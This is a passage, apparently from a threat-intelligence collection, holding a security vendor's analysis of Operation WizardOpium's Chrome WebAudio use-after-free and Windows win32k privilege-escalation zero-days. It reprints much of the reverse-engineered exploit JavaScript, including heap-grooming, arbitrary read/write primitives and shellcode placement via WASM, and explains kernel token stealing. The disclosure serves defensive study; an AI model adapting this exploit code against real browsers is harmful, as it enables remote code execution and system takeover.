{
    "id": "9bef6900-7334-49b7-85ce-7fcbd7069049",
    "created_at": "2022-10-25T16:48:24.835803Z",
    "updated_at": "2025-03-27T02:15:35.737703Z",
    "deleted_at": null,
    "sha1_hash": "e76e32e631c965b225e1e3eae6ba3d480a01d3a7",
    "title": "",
    "authors": "",
    "file_creation_date": "2020-05-29T02:43:11Z",
    "file_modification_date": "2020-05-29T02:43:11Z",
    "file_size": 193575,
    "plain_text": "# The zero-day exploits of Operation WizardOpium\n\n**[securelist.com/the-zero-day-exploits-of-operation-wizardopium/97086](https://securelist.com/the-zero-day-exploits-of-operation-wizardopium/97086/)**\n\nBoris Larin, Alexey Kulaev\n\nBack in October 2019 we detected a classic watering-hole attack on a North Korea-related news\nsite that exploited a chain of Google Chrome and Microsoft Windows zero-days. While we’ve\n[already published blog posts briefly describing this operation (available here and here), in this](https://securelist.com/chrome-0-day-exploit-cve-2019-13720-used-in-operation-wizardopium/94866/)\nblog post we’d like to take a deep technical dive into the exploits and vulnerabilities used in this\nattack.\n\n## Google Chrome remote code execution exploit\n\n[In the original blog post we described the exploit loader responsible for initial validation of the](https://securelist.com/chrome-0-day-exploit-cve-2019-13720-used-in-operation-wizardopium/94866/)\ntarget and execution of the next stage JavaScript code containing the full browser exploit. The\nexploit is huge because, besides code, it contains byte arrays with shellcode, a Portable\nExecutable (PE) file and WebAssembly (WASM) module used in the later stages of exploitation.\nThe exploit abused a vulnerability in the WebAudio OfflineAudioContext interface and was\ntargeting two release builds of Google Chrome 76.0.3809.87 and 77.0.3865.75. However, the\nvulnerability was introduced long before that and much earlier releases with a WebAudio\ncomponent are also vulnerable. At the time of our discovery the current version of Google\nChrome was 78, and while this version was also affected, the exploit did not support it and had a\nnumber of checks to ensure that it would only be executed on affected versions to prevent\ncrashes. After our report, the vulnerability was assigned CVE-2019-13720 and was fixed in\n[version 78.0.3904.87 with the following commit. A use-after-free (UAF) vulnerability, it could be](https://chromium.googlesource.com/chromium/src.git/+/6a2e670a243b815cf043f8da4d26ecb9a64d307b)\ntriggered due to a race condition between the Render and Audio threads:\n\n\n### 1 2 3 4 5 6\n\n\n###  if (!buffer) { + BaseAudioContext::GraphAutoLocker context_locker(Context()); + MutexLocker locker(process_lock_); reverb_.reset(); shared_buffer_ = nullptr; return;\n\n\nAs you can see, when the audio buffer is set to null in ConvolverNode and an active buffer\nalready exists within the Reverb object, the function SetBuffer() can destroy reverb_ and\nshared_buffer_ objects.\n\n\n### 1 2 3 4 5\n\n\n### class MODULES_EXPORT ConvolverHandler final : public AudioHandler { ...  std::unique_ptr<Reverb> reverb_;  std::unique_ptr<SharedAudioBuffer> shared_buffer_; ...\n\n\nThese objects might still be in use by the Render thread because there is no proper\nsynchronization between the two threads in the code. A patch added two missing locks (graph\nlock and process lock) for when the buffer is nullified.\n\n\n-----\n\nThe exploit code was obfuscated, but we were able to fully reverse engineer it and reveal all the\nsmall details. By looking at the code, we can see the author of the exploit has excellent\n[knowledge of the internals of specific Google Chrome components, especially the PartitionAlloc](https://github.com/scrapy/base-chromium/blob/master/allocator/partition_allocator/PartitionAlloc.md)\nmemory allocator. This can clearly be seen from the snippets of reverse engineered code below.\nThese functions are used in the exploit to retrieve useful information from internal structures of\nthe allocator, including: SuperPage address, PartitionPage address by index inside the\nSuperPage, the index of the used PartitionPage and the address of PartitionPage metadata. All\n[constants are taken from partition_alloc_constants.h:](https://chromium.googlesource.com/chromium/src/+/master/base/allocator/partition_allocator/partition_alloc_constants.h)\n\n\n### 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33\n\n\n### function getSuperPageBase(addr) { let superPageOffsetMask = (BigInt(1) << BigInt(21)) - BigInt(1); let superPageBaseMask = ~superPageOffsetMask; let superPageBase = addr & superPageBaseMask; return superPageBase; } function getPartitionPageBaseWithinSuperPage(addr, partitionPageIndex) { let superPageBase = getSuperPageBase(addr); let partitionPageBase = partitionPageIndex << BigInt(14); let finalAddr = superPageBase + partitionPageBase; return finalAddr; } function getPartitionPageIndex(addr) { let superPageOffsetMask = (BigInt(1) << BigInt(21)) - BigInt(1); let partitionPageIndex = (addr & superPageOffsetMask) >> BigInt(14); return partitionPageIndex; } function getMetadataAreaBaseFromPartitionSuperPage(addr) { let superPageBase = getSuperPageBase(addr); let systemPageSize = BigInt(0x1000); return superPageBase + systemPageSize; } function getPartitionPageMetadataArea(addr) { let superPageOffsetMask = (BigInt(1) << BigInt(21)) - BigInt(1); let partitionPageIndex = (addr & superPageOffsetMask) >> BigInt(14); let pageMetadataSize = BigInt(0x20); let partitionPageMetadataPtr = getMetadataAreaBaseFromPartitionSuperPage(addr) + partitionPageIndex * pageMetadataSize; return partitionPageMetadataPtr; }\n\n\n[It’s interesting that the exploit also uses the relatively new built-in BigInt class to handle 64-bit](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/BigInt)\nvalues; authors usually use their own primitives in exploits.\n\nAt first, the code initiates OfflineAudioContext and creates a huge number of IIRFilterNode\nobjects that are initialized via two float arrays.\n\n\n-----\n\n### 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16\n\n\n### let gcPreventer = []; let iirFilters = []; function initialSetup() { let audioCtx = new OfflineAudioContext(1, 20, 3000); let feedForward = new Float64Array(2); let feedback = new Float64Array(1); feedback[0] = 1; feedForward[0] = 0; feedForward[1] = -1; for (let i = 0; i < 256; i++)     iirFilters.push(audioCtx.createIIRFilter(feedForward, feedback)); }\n\n\nAfter that, the exploit begins the initial stage of exploitation and tries to trigger a UAF bug. For that\nto work the exploit creates the objects that are needed for the Reverb component. It creates\nanother huge OfflineAudioContext object and two ConvolverNode objects – ScriptProcessorNode\nto start audio processing and AudioBuffer for the audio channel.\n\n\n### 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31\n\n\n### async function triggerUaF(doneCb) { let audioCtx = new OfflineAudioContext(2, 0x400000, 48000); let bufferSource = audioCtx.createBufferSource(); let convolver = audioCtx.createConvolver(); let scriptNode = audioCtx.createScriptProcessor(0x4000, 1, 1); let channelBuffer = audioCtx.createBuffer(1, 1, 48000); convolver.buffer = channelBuffer; bufferSource.buffer = channelBuffer; bufferSource.loop = true; bufferSource.loopStart = 0; bufferSource.loopEnd = 1; channelBuffer.getChannelData(0).fill(0); bufferSource.connect(convolver); convolver.connect(scriptNode); scriptNode.connect(audioCtx.destination); bufferSource.start(); let finished = false; scriptNode.onaudioprocess = function(evt) {   let channelDataArray = new Uint32Array(evt.inputBuffer.getChannelData(0).buffer);   for (let j = 0; j < channelDataArray.length; j++) {     if (j + 1 < channelDataArray.length && channelDataArray[j] != 0 && channel‐ DataArray[j + 1] != 0) {       let u64Array = new BigUint64Array(1);       let u32Array = new Uint32Array(u64Array.buffer);       u32Array[0] = channelDataArray[j + 0];       u32Array[1] = channelDataArray[j + 1];       let leakedAddr = byteSwapBigInt(u64Array[0]);       if (leakedAddr >> BigInt(32) > BigInt(0x8000))         leakedAddr -= BigInt(0x800000000000);\n let superPageBase = getSuperPageBase(leakedAddr);\n\n\n-----\n\n### 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72\n\n\n###       if (superPageBase > BigInt(0xFFFFFFFF) && superPageBase < BigInt(0xFFFFFFFFFFFF)) {         finished = true;         evt = null;         bufferSource.disconnect();         scriptNode.disconnect();         convolver.disconnect();         setTimeout(function() {           doneCb(leakedAddr);         }, 1);         return;       }     }   } }; audioCtx.startRendering().then(function(buffer) {   buffer = null;   if (!finished) {     finished = true;      triggerUaF(doneCb);   } }); while (!finished) {   convolver.buffer = null;   convolver.buffer = channelBuffer;   await later(100); // wait 100 millseconds } };\n\n\nThis function is executed recursively. It fills the audio channel buffer with zeros, starts rendering\noffline and at the same time runs a loop that nullifies and resets the channel buffer of the\nConvolverNode object and tries to trigger a bug. The exploit uses the later() function to simulate\nthe Sleep function, suspend the current thread and let the Render and Audio threads finish\nexecution right on time:\n\n\n### 1 2 3\n\n\n### function later(delay) { return new Promise(resolve => setTimeout(resolve, delay)); }\n\n\n-----\n\nDuring execution the exploit checks if the audio channel buffer contains any data that differs from\nthe previously set zeroes. The existence of such data would mean the UAF was triggered\nsuccessfully and at this stage the audio channel buffer should contain a leaked pointer.\n\nThe PartitionAlloc memory allocator has a special exploit mitigation that works as follows: when\nthe memory region is freed, it byteswaps the address of the pointer and after that the\nbyteswapped address is added to the FreeList structure. This complicates exploitation because\nthe attempt to dereference such a pointer will crash the process. To bypass this technique the\nexploit uses the following primitive that simply swaps the pointer back:\n\n\n### 1 2 3 4 5 6 7 8 9 10 11 12\n\n\n### function byteSwapBigInt(x) { let result = BigInt(0); let tmp = x; for (let i = 0; i < 8; i++) {   result = result << BigInt(8);   result += tmp & BigInt(0xFF);   tmp = tmp >> BigInt(8); } return result; }\n\n\nThe exploit uses the leaked pointer to get the address of the SuperPage structure and verifies it.\nIf everything goes to plan, then it should be a raw pointer to a temporary_buffer_ object of the\nReverbConvolverStage class that is passed to the callback function initialUAFCallback.\n\n\n### 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20\n\n\n### let sharedAudioCtx; let iirFilterFeedforwardAllocationPtr; function initialUAFCallback(addr) { sharedAudioCtx = new OfflineAudioContext(1, 1, 3000); let partitionPageIndexDelta = undefined; switch (majorVersion) {   case 77: // 77.0.3865.75     partitionPageIndexDelta = BigInt(-26);     break;   case 76: // 76.0.3809.87     partitionPageIndexDelta = BigInt(-25);      break; } iirFilterFeedforwardAllocationPtr = getPartitionPageBaseWithinSuperPage(addr, getPartitionPageIndex(addr) + partitionPageIndexDelta) + BigInt(0xFF0);   triggerSecondUAF(byteSwapBigInt(iirFilterFeedforwardAllocationPtr), finalUAF‐ Callback); }\n\n\nThe exploit uses the leaked pointer to get the address of the raw pointer to the feedforward_ array\nwith the AudioArray<double> type that is present in the IIRProcessor object created with\nIIRFilterNode. This array should be located in the same SuperPage, but in different versions of\n\n\n-----\n\nChrome this object is created in different PartitionPages and there is a special code inside\ninitialUAFCallback to handle that.\n\nThe vulnerability is actually triggered not once but twice. After the address of the right object is\nacquired, the vulnerability is exploited again. This time the exploit uses two AudioBuffer objects of\ndifferent sizes, and the previously retrieved address is sprayed inside the larger AudioBuffer. This\nfunction also executes recursively.\n\n\n### 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45\n\n\n### let floatArray = new Float32Array(10); let audioBufferArray1 = []; let audioBufferArray2 = []; let imageDataArray = []; async function triggerSecondUAF(addr, doneCb) { let counter = 0; let numChannels = 1; let audioCtx = new OfflineAudioContext(1, 0x100000, 48000); let bufferSource = audioCtx.createBufferSource(); let convolver = audioCtx.createConvolver(); let bigAudioBuffer = audioCtx.createBuffer(numChannels, 0x100, 48000); let smallAudioBuffer = audioCtx.createBuffer(numChannels, 0x2, 48000); smallAudioBuffer.getChannelData(0).fill(0); for (let i = 0; i < numChannels; i++) {   let channelDataArray = new BigUint64Array(bigAudioBuffer.getChannelData(i).buffer);   channelDataArray[0] = addr; } bufferSource.buffer = bigAudioBuffer; convolver.buffer = smallAudioBuffer; bufferSource.loop = true; bufferSource.loopStart = 0; bufferSource.loopEnd = 1; bufferSource.connect(convolver); convolver.connect(audioCtx.destination); bufferSource.start(); let finished = false;   audioCtx.startRendering().then(function(buffer) {   buffer = null;   if (finished) {     audioCtx = null;     setTimeout(doneCb, 200);     return;   } else {     finished = true;     setTimeout(function() {       triggerSecondUAF(addr, doneCb);     }, 1);   } }); while (!finished) {   counter++;   convolver.buffer = null;   await later(1); // wait 1 millisecond   if (finished)\n\n\n-----\n\n### 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87\n\n\n###     break;   for (let i = 0; i < iirFilters.length; i++) {     floatArray.fill(0);        iirFilters[i].getFrequencyResponse(floatArray, floatArray, floatArray);     if (floatArray[0] != 3.1415927410125732) {       finished = true;          audioBufferArray2.push(audioCtx.createBuffer(1, 1, 10000));         audioBufferArray2.push(audioCtx.createBuffer(1, 1, 10000));       bufferSource.disconnect();       convolver.disconnect();       return;     }   }   convolver.buffer = smallAudioBuffer;   await later(1); // wait 1 millisecond } }\n\n\nThis time the exploit uses the function getFrequencyResponse() to check if exploitation was\nsuccessful. The function creates an array of frequencies that is filled with a Nyquist filter and the\nsource array for the operation is filled with zeroes.\n\n\n-----\n\n### 1 2 3 4 5 6 7 8 9 10 11 12\n\n\n### void IIRDSPKernel::GetFrequencyResponse(int n_frequencies,                   const float* frequency_hz,                   float* mag_response,                   float* phase_response) { ...  Vector<float> frequency(n_frequencies);  double nyquist = this->Nyquist();  // Convert from frequency in Hz to normalized frequency (0 -> 1),  // with 1 equal to the Nyquist frequency.  for (int k = 0; k < n_frequencies; ++k) frequency[k] = frequency_hz[k] / nyquist; ...\n\n\nIf the resulting array contains a value other than π, it means exploitation was successful. If that’s\nthe case, the exploit stops its recursion and executes the function finalUAFCallback to allocate\nthe audio channel buffer again and reclaim the previously freed memory. This function also\nrepairs the heap to prevent possible crashes by allocating various objects of different sizes and\nperforming defragmentation of the heap. The exploit also creates BigUint64Array, which is used\nlater to create an arbitrary read/write primitive.\n\n\n-----\n\n### 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34\n\n\n### async function finalUAFCallback() { for (let i = 0; i < 256; i++) {   floatArray.fill(0);     iirFilters[i].getFrequencyResponse(floatArray, floatArray, floatArray);   if (floatArray[0] != 3.1415927410125732) {     await collectGargabe();     audioBufferArray2 = [];     for (let j = 0; j < 80; j++)         audioBufferArray1.push(sharedAudioCtx.createBuffer(1, 2, 10000));     iirFilters = new Array(1);      await collectGargabe();     for (let j = 0; j < 336; j++)       imageDataArray.push(new ImageData(1, 2));     imageDataArray = new Array(10);     await collectGargabe();     for (let j = 0; j < audioBufferArray1.length; j++) {       let auxArray = new BigUint64Array(audioBufferArray1[j].getChannelData(0).buffer);       if (auxArray[0] != BigInt(0)) {         kickPayload(auxArray);         return;       }       }     return;   } } }\n\n\nHeap defragmentation is performed with multiple calls to the improvised collectGarbage function\nthat creates a huge ArrayBuffer in a loop.\n\n\n### 1 2 3 4 5 6 7 8 9\n\n\n### function collectGargabe() { let promise = new Promise(function(cb) {   let arg;   for (let i = 0; i < 400; i++)     new ArrayBuffer(1024 * 1024 * 60).buffer;   cb(arg); }); return promise; }\n\n\nAfter those steps, the exploit executes the function kickPayload() passing the previously created\nBigUint64Array containing the raw pointer address of the previously freed AudioArray’s data.\n\n\n-----\n\n### 1 2 3 4 5 6 7 8 9 10 11 12 13\n\n\n### async function kickPayload(auxArray) { let audioCtx = new OfflineAudioContext(1, 1, 3000); let partitionPagePtr = getPartitionPageMetadataArea(byteSwapBigInt(auxArray[0])); auxArray[0] = byteSwapBigInt(partitionPagePtr); let i = 0; do {   gcPreventer.push(new ArrayBuffer(8));   if (++i > 0x100000)     return; } while (auxArray[0] != BigInt(0)); let freelist = new BigUint64Array(new ArrayBuffer(8)); gcPreventer.push(freelist); ...\n\n\nThe exploit manipulates the PartitionPage metadata of the freed object to achieve the following\nbehavior. If the address of another object is written in BigUint64Array at index zero and if a new 8byte object is created and the value located at index 0 is read back, then a value located at the\npreviously set address will be read. If something is written at index 0 at this stage, then this value\nwill be written to the previously set address instead.\n\n\n### 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15\n\n\n### function read64(rwHelper, addr) { rwHelper[0] = addr; var tmp = new BigUint64Array; tmp.buffer; gcPreventer.push(tmp); return byteSwapBigInt(rwHelper[0]); } function write64(rwHelper, addr, value) { rwHelper[0] = addr; var tmp = new BigUint64Array(1); tmp.buffer; tmp[0] = value; gcPreventer.push(tmp); }\n\n\nAfter the building of the arbitrary read/write primitives comes the final stage – executing the code.\nThe exploit achieves this by using a popular technique that exploits the Web Assembly (WASM)\nfunctionality. Google Chrome currently allocates pages for just-in-time (JIT) compiled code with\nread/write/execute (RWX) privileges and this can be used to overwrite them with shellcode. At\nfirst, the exploit initiates a “dummy” WASM module and it results in the allocation of memory\npages for JIT compiled code.\n\n\n-----\n\n### 1 2 3 4 5 6 7 8 9 10\n\n\n### const wasmBuffer = new Uint8Array([...]); const wasmBlob = new Blob([wasmBuffer], { type: \"application/wasm\" }); const wasmUrl = URL.createObjectURL(wasmBlob); var wasmFuncA = undefined; WebAssembly.instantiateStreaming(fetch(wasmUrl), {}).then(function(result) { wasmFuncA = result.instance.exports.a; });\n\n\nTo execute the exported function wasmFuncA, the exploit creates a FileReader object. When this\nobject is initiated with data it creates a FileReaderLoader object internally. If you can parse\nPartitionAlloc allocator structures and know the size of the next object that will be allocated, you\ncan predict which address it will be allocated to. The exploit uses the\n_getPartitionPageFreeListHeadEntryBySlotSize() function with the provided size and gets the_\naddress of the next free block that will be allocated by FileReaderLoader.\n\n\n### 1 2 3 4 5 6 7 8 9 10 11\n\n\n### let fileReader = new FileReader; let fileReaderLoaderSize = 0x140; let fileReaderLoaderPtr = getPartitionPageFreeListHeadEntryBySlotSize(freelist, iirFilterFeedforwardAllocationPtr, fileReaderLoaderSize); if (!fileReaderLoaderPtr) return; fileReader.readAsArrayBuffer(new Blob([])); let fileReaderLoaderTestPtr = getPartitionPageFreeListHeadEntryBySlotSize(freel‐ ist, iirFilterFeedforwardAllocationPtr, fileReaderLoaderSize); if (fileReaderLoaderPtr == fileReaderLoaderTestPtr) return;\n\n\nThe exploit obtains this address twice to find out if the FileReaderLoader object was created and\nif the exploit can continue execution. The exploit sets the exported WASM function to be a\ncallback for a FileReader event (in this case, an onerror callback) and because the FileReader\ntype is derived from EventTargetWithInlineData, it can be used to get the addresses of all its\nevents and the address of the JIT compiled exported WASM function.\n\n\n-----\n\n### 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26\n\n\n### fileReader.onerror = wasmFuncA; let fileReaderPtr = read64(freelist, fileReaderLoaderPtr + BigInt(0x10)) - BigInt(0x68); let vectorPtr = read64(freelist, fileReaderPtr + BigInt(0x28)); let registeredEventListenerPtr = read64(freelist, vectorPtr); let eventListenerPtr = read64(freelist, registeredEventListenerPtr); let eventHandlerPtr = read64(freelist, eventListenerPtr + BigInt(0x8)); let jsFunctionObjPtr = read64(freelist, eventHandlerPtr + BigInt(0x8)); let jsFunctionPtr = read64(freelist, jsFunctionObjPtr) - BigInt(1); let sharedFuncInfoPtr = read64(freelist, jsFunctionPtr + BigInt(0x18)) - BigInt(1); let wasmExportedFunctionDataPtr = read64(freelist, sharedFuncInfoPtr + BigInt(0x8)) - BigInt(1); let wasmInstancePtr = read64(freelist, wasmExportedFunctionDataPtr + BigInt(0x10)) - BigInt(1); let stubAddrFieldOffset = undefined; switch (majorVersion) { case 77:   stubAddrFieldOffset = BigInt(0x8) * BigInt(16); break; case 76:   stubAddrFieldOffset = BigInt(0x8) * BigInt(17); break } let stubAddr = read64(freelist, wasmInstancePtr + stubAddrFieldOffset);\n\n\nThe variable stubAddr contains the address of the page with the stub code that jumps to the JIT\ncompiled WASM function. At this stage it’s sufficient to overwrite it with shellcode. To do so, the\nexploit uses the function getPartitionPageFreeListHeadEntryBySlotSize() again to find the next\nfree block of 0x20 bytes, which is the size of the structure for the ArrayBuffer object. This object is\ncreated when the exploit creates a new audio buffer.\n\n\n### 1 2 3 4 5 6 7\n\n\n### let arrayBufferSize = 0x20; let arrayBufferPtr = getPartitionPageFreeListHeadEntryBySlotSize(freelist, iirFilter‐ FeedforwardAllocationPtr, arrayBufferSize); if (!arrayBufferPtr) return; let audioBuffer = audioCtx.createBuffer(1, 0x400, 6000); gcPreventer.push(audioBuffer);\n\n\nThe exploit uses arbitrary read/write primitives to get the address of the DataHolder class that\ncontains the raw pointer to the data and size of the audio buffer. The exploit overwrites this\npointer with stubAddr and sets a huge size.\n\n\n### 1 2 3 4\n\n\n### let dataHolderPtr = read64(freelist, arrayBufferPtr + BigInt(0x8)); write64(freelist, dataHolderPtr + BigInt(0x8), stubAddr); write64(freelist, dataHolderPtr + BigInt(0x10), BigInt(0xFFFFFFF));\n\n\n-----\n\nNow all that’s needed is to implant a Uint8Array object into the memory of this audio buffer and\nplace shellcode there along with the Portable Executable that will be executed by the shellcode.\n\n\n### 1 2 3\n\n\n### let payloadArray = new Uint8Array(audioBuffer.getChannelData(0).buffer); payloadArray.set(shellcode, 0); payloadArray.set(peBinary, shellcode.length);\n\n\nTo prevent the possibility of a crash the exploit clears the pointer to the top of the FreeList\nstructure used by the PartitionPage.\n\n### 1 write64(freelist, partitionPagePtr, BigInt(0));\n\nNow, in order to execute the shellcode, it’s enough to call the exported WASM function.\n\n\n### 1 2 3\n\n\n### try { wasmFuncA(); } catch (e) {}\n\n\n## Microsoft Windows elevation of privilege exploit\n\nThe shellcode appeared to be a Reflective PE loader for the Portable Executable module that\nwas also present in the exploit. This module mostly consisted of the code to escape Google\nChrome’s sandbox by exploiting the Windows kernel component win32k for the elevation of\nprivileges and it was also responsible for downloading and executing the actual malware. On\ncloser analysis, we found that the exploited vulnerability was in fact a zero-day. We notified\nMicrosoft Security Response Center and they assigned it CVE-2019-1458 and fixed the\nvulnerability. The win32k component has something of bad reputation. It has been present since\nWindows NT 4.0 and, according to Microsoft, it is responsible for more than 50% of all kernel\nsecurity bugs. In the last two years alone Kaspersky has found five zero-days in the wild that\nexploited win32k vulnerabilities. That’s quite an interesting statistic considering that since the\nrelease of Windows 10, Microsoft has implemented a number of mitigations aimed at complicating\nexploitation of win32k vulnerabilities and the majority of zero-days that we found exploited\nversions of Microsoft Windows prior to the release of Windows 10 RS4. The elevation of privilege\nexploit used in Operation WizardOpium was built to support Windows 7, Windows 10 build 10240\nand Windows 10 build 14393. It’s also important to note that Google Chrome has a special\n[security feature called Win32k lockdown developed and supported by James Forshaw of Google](https://googleprojectzero.blogspot.com/2016/11/breaking-chain.html)\nProject Zero. This security feature eliminates the whole win32k attack surface by disabling access\nto win32k syscalls from inside Chrome processes. Unfortunately, Win32k lockdown is only\nsupported on machines running Windows 10. So, it’s fair to assume that Operation WizardOpium\ntargeted users running Windows 7.\n\nCVE-2019-1458 is an Arbitrary Pointer Dereference vulnerability. In win32k Window objects are\nrepresented by a tagWND structure. There are also a number of classes based on this structure:\nScrollBar, Menu, Listbox, Switch and many others. The FNID field of tagWND structure is used to\ndistinguish the type of class. Different classes also have various extra data appended to the\ntagWND structure. This extra data is basically just different structures that often include kernel\npointers. Besides that, in the win32k component there’s a syscall SetWindowLongPtr that can be\n\n\n-----\n\nused to set this extra data (after validation of course). It’s worth noting that SetWindowLongPtr\nwas related to a number of vulnerabilities in the past (e.g., CVE-2010-2744, CVE-2016-7255, and\n[CVE-2019-0859). There’s a common issue when pre-initialized extra data can lead to system](https://securelist.com/new-win32k-zero-day-cve-2019-0859/90435/)\nprocedures incorrectly handling. In the case of CVE-2019-1458, the validation performed by\nSetWindowLongPtr was just insufficient.\n\n\n### 1 2 3 4 5 6 7 8\n\n\n### xxxSetWindowLongPtr(tagWND *pwnd, int index, QWORD data, ...) ... if ( (int)index >= gpsi->mpFnid_serverCBWndProc[(pwnd->fnid & 0x3FFF) - 0x29A]\n - sizeof(tagWND) ) ... extraData = (BYTE*)tagWND + sizeof(tagWND) + index old = *(QWORD*)extraData; *(QWORD*)extraData = data; return old;\n\n\nA check for the index parameter would have prevented this bug, but prior to the patch the values\nfor FNID_DESKTOP, FNID_SWITCH, FNID_TOOLTIPS inside the mpFnid_serverCBWndProc\ntable were not initialized, rendering this check useless and allowing the kernel pointers inside the\nextra data to be overwritten.\n\nTriggering the bug is quite simple: at first, you create a Window, then NtUserMessageCall can be\nused to call any system class window procedure.\n\n### 1 gpsi->mpFnidPfn[(dwType + 6) & 0x1F]((tagWND *)wnd, msg, wParam, lParam, resultInfo);\n\nIt’s important to provide the right message and dwType parameters. The message needs to be\nequal to WM_CREATE. dwType is converted to fnIndex internally with the following calculation:\n(dwType + 6) & 0x1F. The exploit uses a dwType equal to 0xE0. It results in an fnIndex equal to 6\nwhich is the function index of xxxSwitchWndProc and the WM_CREATE message sets the FNID\nfield to be equal to FNID_SWITCH.\n\n\n-----\n\n### 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33\n\n\n### LRESULT xxxSwitchWndProc(tagWND *wnd, UINT msg, WPARAM wParam, LPARAM lParam) { ...  pti = *(tagTHREADINFO **)&gptiCurrent;  if ( wnd->fnid != FNID_SWITCH )  {   if ( wnd->fnid || wnd->cbwndExtra + 296 < (unsigned int)gpsi->mpFnid_server‐ CBWndProc[6] )    return 0i64;   if ( msg != 1 )    return xxxDefWindowProc(wnd, msg, wParam, lParam);   if ( wnd[1].head.h )    return 0i64;   wnd->fnid = FNID_SWITCH;  }  switch ( msg )  {   case WM_CREATE:    zzzSetCursor(wnd->pcls->spcur, pti, 0i64);    break;   case WM_CLOSE:    xxxSetWindowPos(wnd, 0, 0);    xxxCancelCoolSwitch();    break;   case WM_ERASEBKGND:   case WM_FULLSCREEN:    pti->ptl = (_TL *)&pti->ptl;    ++wnd->head.cLockObj;    xxxPaintSwitchWindow(wnd, pti, 0i64);    ThreadUnlock1();    return 0i64;  }  return xxxDefWindowProc(wnd, msg, wParam, lParam); }\n\n\nThe vulnerability in NtUserSetWindowLongPtr can then be used to overwrite the extra data at\nindex zero, which happens to be a pointer to a structure containing information about the Switch\nWindow. In other words, the vulnerability makes it possible to set some arbitrary kernel pointer\nthat will be treated as this structure.\n\nAt this stage it’s enough to call NtUserMessageCall again, but this time with a message equal to\nWM_ERASEBKGND. This results in the execution of the function xxxPaintSwitchWindow that\nincrements and decrements a couple of integers located by the pointer that we previously set.\n\n\n### 1 2 3 4 5\n\n\n### sub   [rdi+60h], ebx add   [rdi+68h], ebx ... sub   [rdi+5Ch], ecx add   [rdi+64h], ecx\n\n\n-----\n\nAn important condition for triggering the exploitable code path is that the ALT key needs to be\npressed.\n\nExploitation is performed by abusing Bitmaps. For successful exploitation a few Bitmaps need to\nbe allocated next to each other, and their kernel addresses need to be known. To achieve this, the\nexploit uses two common kernel ASLR bypass techniques. For Windows 7 and Windows 10 build\n10240 (Threshold 1) the Bitmap kernel addresses are leaked via the GdiSharedHandleTable\n[technique: in older versions of the OS there is a special table available in the user level that holds](https://www.coresecurity.com/blog/abusing-gdi-for-ring0-exploit-primitives)\nthe kernel addresses of all GDI objects present in the process. This particular technique was\npatched in Windows 10 build 14393 (Redstone 1), so for this version the exploit uses another\n[common technique that abuses Accelerator Tables (patched in Redstone 2). It involves creating a](https://labs.f-secure.com/archive/a-tale-of-bitmaps/)\nCreate Accelerator Table object, leaking its kernel address from the gSharedInfo HandleTable\navailable in the user level, and then freeing the Accelerator Table object and allocating a Bitmap\nreusing the same memory address.\n\nThe whole exploitation process works as follows: the exploit creates three bitmaps located next to\neach other and their addresses are leaked. The exploit prepares Switch Window and uses a\nvulnerability in NtUserSetWindowLongPtr to set an address pointing near the end of the first\nBitmap as Switch Window extra data. Bitmaps are represented by a SURFOBJ structure and the\npreviously set address needs to be calculated in a way that will make the xxxPaintSwitchWindow\nfunction increment the sizlBitmap field of the SURFOBJ structure for the Bitmap allocated next to\nthe first one. The sizlBitmap field indicates the bounds of the pixel data buffer and the\nincremented value will allow the use of the function SetBitmapBits() to perform an out-of-bounds\nwrite and overwrite the SURFOBJ of the third Bitmap object.\n\nThe pvScan0 field of the SURFOBJ structure is an address of the pixel data buffer, so the ability\nto overwrite it with an arbitrary pointer results in arbitrary read/write primitives via the functions\nGetBitmapBits()/SetBitmapBits(). The exploit uses these primitives to parse the EPROCESS\nstructure and steal the system token. To get the kernel address of the EPROCESS structure, the\n[exploit uses the function EnumDeviceDrivers. This function works according to its MSDN](https://docs.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumdevicedrivers)\ndescription and it provides a list of kernel addresses for currently loaded drivers. The first address\nin the list is the address of ntkrnl and to get the offset to the EPROCESS structure the exploit\nparses an executable in search for the exported PsInitialSystemProcess variable.\n\nIt’s worth noting that this technique still works in the latest versions of Windows (tested with\nWindows 10 19H1 build 18362). Stealing the system token is the most common post exploitation\ntechnique that we see in the majority of elevation of privilege exploits. After acquiring system\nprivileges the exploit downloads and executes the actual malware.\n\n## Conclusions\n\nIt was particularly interesting for us to examine the Chrome exploit because it was the first Google\nChrome in-the-wild zero-day encountered for a while. It was also interesting that it was used in\ncombination with an elevation of privilege exploit that didn’t allow exploitation on the latest\nversions of Windows mostly due to the Win32k lockdown security feature of Google Chrome. With\nregards to privilege elevation, it was also interesting that we found another 1-day exploit for this\nvulnerability just one week after the patch, indicating how simple it is to exploit this vulnerability.\n\n\n-----\n\n_We would like to thank the Google Chrome and Microsoft security teams for fixing these_\n_vulnerabilities so quickly. Google was generous enough to offer a bounty for CVE-2019-13720._\n_The reward was donated to charity and Google matched the donation._\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
